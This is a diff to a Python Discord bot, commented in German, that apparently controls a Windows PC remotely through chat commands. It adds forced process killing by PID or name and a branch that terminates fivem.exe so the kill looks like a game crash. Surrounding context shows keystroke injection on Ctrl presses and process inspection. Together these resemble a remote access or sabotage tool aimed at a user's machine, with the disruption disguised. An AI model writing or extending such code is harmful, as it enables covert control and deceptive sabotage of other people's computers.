@@ -1846,16 +1846,42 @@ async def ran(ctx, *, query: str = ""):
     else:
         await ctx.send("Prozess nicht gefunden.")
 
-@bot.command(help="kill a specific process by its PID")
-async def taskkill(ctx, pid: int):
-    # Befehl zum Beenden des Prozesses mit der angegebenen PID
-    result = subprocess.run(['taskkill', '/PID', str(pid)], capture_output=True, text=True, shell=True)
+@bot.command(help="Kill a specific process by its PID or Image Name and simulate a crash")
+async def taskkill(ctx, identifier: str):
+    try:
+        if identifier.isdigit():
+            pid = int(identifier)
+            result = subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True, text=True, shell=True)
+        else:
+            if identifier.lower() == "fivem.exe":
+                # Simuliere einen Absturz für fivem.exe
+                try:
+                    # Finde alle Prozesse mit dem Namen "fivem.exe"
+                    result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq fivem.exe'], capture_output=True, text=True, shell=True)
+                    processes = result.stdout.splitlines()
 
-    # Überprüfen, ob der Prozess erfolgreich beendet wurde
-    if result.returncode == 0:
-        await ctx.send(f"Prozess mit der PID {pid} erfolgreich beendet.")
-    else:
-        await ctx.send(f"Fehler beim Beenden des Prozesses mit der PID {pid}.")
+                    # Suche nach der PID des Prozesses
+                    for process in processes:
+                        if "fivem.exe" in process:
+                            pid = int(process.split()[1])
+                            # Verwende ctypes, um den Prozess zu beenden und einen Absturz zu simulieren
+                            ctypes.windll.kernel32.TerminateProcess(ctypes.windll.kernel32.OpenProcess(1, False, pid), -1)
+                            await ctx.send(f"Prozess 'fivem.exe' mit der PID {pid} erfolgreich simuliert abgestürzt.")
+                            return
+                except Exception as e:
+                    await ctx.send(f"Ein Fehler ist beim Simulieren des Absturzes aufgetreten: {e}")
+                    return
+            else:
+                # Befehl zum Beenden des Prozesses mit dem angegebenen Abbildnamen
+                result = subprocess.run(['taskkill', '/IM', identifier, '/F'], capture_output=True, text=True, shell=True)
+
+        # Überprüfen, ob der Prozess erfolgreich beendet wurde
+        if result.returncode == 0:
+            await ctx.send(f"Prozess mit der PID oder dem Abbildnamen '{identifier}' erfolgreich beendet.")
+        else:
+            await ctx.send(f"Fehler beim Beenden des Prozesses mit der PID oder dem Abbildnamen '{identifier}'. Ausgabe: {result.stdout}")
+    except Exception as e:
+        await ctx.send(f"Ein Fehler ist aufgetreten: {e}")
 
 @bot.command(help= "show some information")
 async def tskmngr(ctx):
@@ -2137,5 +2163,28 @@ async def delonstrg(ctx):
     await ctx.send(f"Sending 'a' with backspace when pressing Ctrl is now {status}.")
 
 ######
+
+@bot.command(help="List all servers the bot is a member of")
+async def serverlist(ctx):
+    servers = list(bot.guilds)
+    response = ""
+    for server in servers:
+        server_info = f"Server: {server.name} (ID: {server.id})\n"
+        if len(response) + len(server_info) > 1900:
+            await ctx.send(response)
+            response = server_info
+        else:
+            response += server_info
+    if response:
+        await ctx.send(response)
+
+@bot.command(help="Leave a server by its ID")
+async def leaveserver(ctx, server_id: int):
+    server = bot.get_guild(server_id)
+    if server is None:
+        await ctx.send(f"Kein Server mit der ID {server_id} gefunden.")
+    else:
+        await server.leave()
+        await ctx.send(f"Bot hat den Server '{server.name}' (ID: {server.id}) verlassen.")
 
 bot.run(TOKEN)
